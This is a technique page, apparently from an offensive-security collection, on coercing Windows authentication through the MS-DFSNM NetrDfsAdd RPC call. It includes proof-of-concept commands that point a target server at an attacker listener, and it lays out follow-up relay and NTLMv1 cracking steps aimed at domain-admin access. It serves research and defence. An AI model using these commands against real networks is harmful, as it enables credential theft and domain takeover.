# MS-DFSNM - Remote call to NetrDfsAdd (opnum 1)

## Summary

+ **Protocol**: [[MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979)

+ **Function name**: [`NetrDfsAdd`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/25938398-c070-4db1-a779-fc78212f3fd8)

+ **Function operation number**: `1`

+ **RPC Interfaces**:
   + Interface 1:
     - uuid=`4fc742e0-4a10-11cf-8273-00aa004ae673`
     - version=`3.0`
     - Accessible through:
       + SMB Named pipe: `\PIPE\netdfs`

## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\PIPE\netdfs` and bind to the desired [`MS-DFSNM`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979) protocol (with uuid `4fc742e0-4a10-11cf-8273-00aa004ae673` and version `3.0`) in order to perform remote procedure calls to functions in the [`MS-DFSNM`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979) protocol.

Note that this protocol refuses an authenticated bind: the association is bound with no RPC-level security and the call runs under the identity of the SMB session established above.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. We will then call the remote [`NetrDfsAdd`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/25938398-c070-4db1-a779-fc78212f3fd8) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
NetrDfsAdd("\\\\domain.local\\namespace\\link\x00", "192.168.2.51\x00", "share\x00", "comment\x00", 0)
```

Unlike the other calls in this folder, this one needs a DFS namespace that already exists on the target: the server verifies `DfsEntryPath` and returns `ERROR_NOT_FOUND (0x00000490)` before it ever looks at the link target. Pass that namespace with `--dfs-path`. Once the namespace resolves, the server verifies the link target named by `ServerName` and `ShareName`, and that verification is what coerces the authentication.

We can try this with this proof of concept code ([coerce_poc.py](./poc/python/coerce_poc.py)):

```bash
./poc/python/coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" --dfs-path "\\\\domain.local\\namespace\\link" 192.168.2.51 192.168.2.1
```

The same call is implemented in Go ([coerce_poc.go](./poc/go/coerce_poc.go)):

```bash
go run coerce_poc.go --target 192.168.2.1 --listener 192.168.2.51 -d LAB.local -u user1 -p 'Podalirius123!' --dfs-path "\\\\domain.local\\namespace\\link"
```

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`). The call itself fails with `ERROR_BAD_NETPATH (0x00000035)`, which is the expected result of a successful coercion: the target has to reach the UNC path before it can report that it cannot.

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!

## Function technical detail

```cpp
NET_API_STATUS NetrDfsAdd(
   [in, string] WCHAR* DfsEntryPath,
   [in, string] WCHAR* ServerName,
   [in, unique, string] WCHAR* ShareName,
   [in, unique, string] WCHAR* Comment,
   [in] DWORD Flags
 );
```

+ **DfsEntryPath**: The pointer to a DFS link path that contains the name of an existing link when additional link targets are being added or the name of a new link is being created. The server MUST verify the existence of the DFS namespace this path specifies, and returns `ERROR_NOT_FOUND` if it does not exist.

+ **ServerName**: The pointer to a null-terminated Unicode string that specifies the DFS link target host name. This is the parameter the server dereferences, and therefore the one that carries the listener.

+ **ShareName**: The pointer to a null-terminated Unicode DFS link target share name string. This can also be a share name with a path relative to the share, for example, "share1\mydir1\mydir2". When specified this way, each pathname component MUST be a directory.

+ **Comment**: The pointer to a null-terminated Unicode string that contains a comment associated with this root or link. This string has no protocol-specified restrictions on length or content. The comment MUST be ignored when adding a target to an existing link.

+ **Flags**: A value indicating the operation to perform: `0x00000000` creates a new link or adds a new target to an existing link, `DFS_ADD_VOLUME (0x00000001)` fails if the link already exists, and `DFS_RESTORE_VOLUME (0x00000002)` adds a target **without verifying its existence** — which suppresses the very check this coercion relies on.

## References

+ Documentation of protocol [MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979
